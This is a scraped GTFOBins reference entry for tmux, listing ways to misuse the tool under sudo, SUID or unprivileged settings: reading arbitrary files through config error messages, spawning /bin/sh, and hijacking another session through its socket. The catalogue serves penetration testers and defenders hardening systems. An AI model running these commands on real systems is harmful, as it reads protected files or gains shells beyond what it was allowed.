{"title": "tmux", "source": "gtfobins", "source_label": "GTFOBins", "path": "tmux", "html": "<h1>tmux</h1>\n<h2>File Read</h2>\n<p>The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.</p>\n<pre><code class=\"language-bash\">tmux -f /path/to/input-file</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">tmux -c /bin/sh</code></pre>\n<p>Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).</p>\n<pre><code class=\"language-bash\">tmux -S /path/to/socket</code></pre>", "excerpt": "tmux File Read The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message. tmux -f /path/to/input-file Shell tmux -c /bin/sh Provided to have enough permissions to access the socket…", "tags": ["func:file-read", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}